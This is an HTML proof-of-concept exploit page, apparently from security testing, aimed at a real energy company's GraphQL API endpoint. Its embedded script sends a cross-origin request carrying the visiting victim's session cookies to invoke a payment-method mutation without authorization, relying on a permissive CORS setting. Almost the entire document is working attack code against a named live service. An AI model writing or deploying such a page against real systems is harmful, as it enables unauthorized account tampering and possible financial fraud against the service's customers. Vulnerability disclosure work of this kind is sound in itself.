<html>
<head>
    <title>Origin Energy HIGH IMPACT CORS MUTATION PoC</title>
</head>
<body>
    <h1>Origin Energy High Impact Mutation PoC</h1>
    <p>This code attempts a critical account mutation (setPaymentMethod) using the victim's session cookies without authorization.</p>
    <pre id="result">Attempting mutation...</pre>

    <script>
        // Targeting the 'setPaymentMethod' mutation discovered via introspection.
        // We use junk/placeholder data as the goal is to prove the *ability to send* the request.
        const HIGH_IMPACT_MUTATION = JSON.stringify({
            query: `mutation { 
                setPaymentMethod(input: {
                    paymentMethodType: CREDIT_CARD,
                    token: "ATTACKER_CONTROLLED_TOKEN_12345"
                }) {
                    success
                    error {
                        message
                    }
                } 
            }`
        });

        fetch('https://api.rx.originenergy.com.au/v1/gateway/graphql', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: HIGH_IMPACT_MUTATION,
            credentials: 'include' // CRITICAL: Includes the victim's session cookies.
        })
        .then(response => {
            // A 200 OK or 400 Bad Request response proves the request was processed by the API.
            if (response.status === 200 || response.status === 400 || response.status === 401) {
                return response.json().catch(() => ({})); 
            }
            throw new Error(`Connection Error or CORS Blocked: ${response.status} ${response.statusText}`);
        })
        .then(data => {
            let output = 'SUCCESS! Cross-Origin Mutation Attempted.\n';
            output += 'The API responded, proving the Wildcard CORS allows financial/account mutations with the victim\'s session.\n';
            output += 'Full Response (Proving API Interaction):\n';
            output += JSON.stringify(data, null, 2);
            
            document.getElementById('result').textContent = output;
            console.log("Mutation PoC Result:", data);
        })
        .catch(error => {
            document.getElementById('result').textContent = 'FATAL ERROR: The CORS request might be fully blocked or URL is wrong. ' + error.message;
            console.error('Hata DetayÄ±:', error);
        });
    </script>
</body>
</html>
